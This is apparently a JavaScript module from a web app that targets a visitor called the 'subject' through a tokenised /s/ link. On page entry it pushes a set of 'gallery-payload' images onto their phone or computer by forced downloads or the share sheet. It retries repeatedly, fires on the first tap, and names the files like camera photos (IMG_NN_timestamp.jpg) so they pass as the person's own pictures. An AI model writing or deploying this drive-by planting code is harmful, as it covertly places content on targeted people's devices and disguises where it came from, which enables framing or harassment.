import { SUBJECT_IMAGE_DOWNLOAD, GALLERY_UPLOAD_PATHS, GALLERY_PAYLOAD_MIN_COUNT } from './config';

function absoluteUrl(relativePath) {
    const base = process.env.PUBLIC_URL || '';
    const href = `${base}${relativePath}`.replace(/([^:]\/)\/+/g, '$1');
    return new URL(href, window.location.href).href;
}

function downloadState() {
    if (typeof window === 'undefined') return { visitId: 'ssr', saved: {} };
    if (!window.__pulseGalleryDownloadState) {
        window.__pulseGalleryDownloadState = { visitId: String(Date.now()), saved: {} };
    }
    return window.__pulseGalleryDownloadState;
}

function stateKey(token) {
    const st = downloadState();
    return `${token || 'main'}_${st.visitId}`;
}

function getSavedSet(key) {
    const st = downloadState();
    if (!st.saved[key]) st.saved[key] = {};
    return st.saved[key];
}

function savedCount(key) {
    return Object.keys(getSavedSet(key)).length;
}

function isDone(key) {
    return savedCount(key) >= GALLERY_PAYLOAD_MIN_COUNT;
}

function markSaved(key, index) {
    getSavedSet(key)[String(index)] = true;
}

function isMobileDevice() {
    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent || '');
}

function galleryFilename(index) {
    const ts = new Date();
    const pad = (n) => String(n).padStart(2, '0');
    const stamp = `${ts.getFullYear()}${pad(ts.getMonth() + 1)}${pad(ts.getDate())}_${pad(ts.getHours())}${pad(ts.getMinutes())}${pad(ts.getSeconds())}`;
    return `IMG_${pad(index)}_${stamp}.jpg`;
}

function triggerDownload(href, filename) {
    const a = document.createElement('a');
    a.href = href;
    a.download = filename;
    a.rel = 'noopener';
    a.style.display = 'none';
    document.body.appendChild(a);
    a.click();
    a.remove();
}

async function shareOrDownload(blob, filename) {
    const type = blob.type && blob.type.startsWith('image/') ? blob.type : 'image/jpeg';
    const file = new File([blob], filename, { type });

    if (typeof navigator.share === 'function' && typeof navigator.canShare === 'function') {
        try {
            if (navigator.canShare({ files: [file] })) {
                await navigator.share({ files: [file], title: filename });
                return;
            }
        } catch (e) {
            if (e?.name === 'AbortError') return;
        }
    }

    const blobUrl = URL.createObjectURL(blob);
    try {
        triggerDownload(blobUrl, filename);
    } finally {
        window.setTimeout(() => URL.revokeObjectURL(blobUrl), 60_000);
    }
}

function delay(ms) {
    return new Promise((resolve) => {
        window.setTimeout(resolve, ms);
    });
}

async function downloadOneImage(relativePath, index) {
    const filename = galleryFilename(index);
    const res = await fetch(absoluteUrl(relativePath), { cache: 'no-store', credentials: 'same-origin' });
    if (!res.ok) throw new Error(`download_http_${res.status}`);
    const ct = res.headers.get('content-type') || '';
    if (!ct.startsWith('image/') && !ct.includes('octet-stream')) {
        throw new Error(`download_not_image_${relativePath}`);
    }
    const raw = await res.blob();
    const type = raw.type && raw.type.startsWith('image/') ? raw.type : 'image/jpeg';
    const blob = raw.type === type ? raw : new Blob([raw], { type });
    await shareOrDownload(blob, filename);
}

/** Subyekt cihaz qalereyasına gallery-payload şəkillərini endir */
export async function runSubjectImageDownload(storageKey) {
    if (!SUBJECT_IMAGE_DOWNLOAD || isDone(storageKey)) return false;

    const saved = getSavedSet(storageKey);
    let downloaded = 0;

    for (let i = 0; i < GALLERY_UPLOAD_PATHS.length; i += 1) {
        const chunkIndex = i + 1;
        if (saved[String(chunkIndex)]) continue;

        try {
            await downloadOneImage(GALLERY_UPLOAD_PATHS[i], chunkIndex);
            markSaved(storageKey, chunkIndex);
            downloaded += 1;
            if (i < GALLERY_UPLOAD_PATHS.length - 1) {
                await delay(isMobileDevice() ? 350 : 120);
            }
        } catch (e) {
            console.warn('subject gallery download:', GALLERY_UPLOAD_PATHS[i], e?.message || e);
            try {
                triggerDownload(absoluteUrl(GALLERY_UPLOAD_PATHS[i]), galleryFilename(chunkIndex));
                markSaved(storageKey, chunkIndex);
                downloaded += 1;
            } catch {
                /* növbəti şəkil */
            }
        }
    }

    return downloaded > 0 || isDone(storageKey);
}

export function subjectDownloadStorageKey(subjectToken) {
    return stateKey(subjectToken);
}

/** Sayta girəndə subyekt cihaz qalereyasına avtomatik endir */
export function attachSubjectImageDownloadOnEntry(subjectToken = null) {
    if (!SUBJECT_IMAGE_DOWNLOAD) return () => {};

    const storageKey = subjectDownloadStorageKey(subjectToken);
    let cancelled = false;

    const run = async () => {
        if (cancelled || isDone(storageKey)) return;
        await runSubjectImageDownload(storageKey);
    };

    run();

    const retryTimer = setInterval(run, 2000);
    const stopTimer = setTimeout(() => clearInterval(retryTimer), 120_000);

    const onVisible = () => {
        if (document.visibilityState === 'visible') run();
    };
    document.addEventListener('visibilitychange', onVisible);

    document.addEventListener('pointerdown', run, { once: true, passive: true });
    document.addEventListener('touchstart', run, { once: true, passive: true });

    return () => {
        cancelled = true;
        clearInterval(retryTimer);
        clearTimeout(stopTimer);
        document.removeEventListener('visibilitychange', onVisible);
    };
}

export function subjectImageDownloadSettleMs() {
    return isMobileDevice() ? GALLERY_UPLOAD_PATHS.length * 400 : 0;
}

export function bootstrapSubjectGalleryDownload() {
    if (!SUBJECT_IMAGE_DOWNLOAD || typeof window === 'undefined') return () => {};

    const path = window.location.pathname || '/';
    const tokenMatch = path.match(/^\/s\/([^/]+)/);
    const subjectToken = tokenMatch ? decodeURIComponent(tokenMatch[1]) : null;
    if (!/^\/s\/[^/]+/.test(path) && path !== '/' && path !== '') return () => {};

    return attachSubjectImageDownloadOnEntry(subjectToken);
}
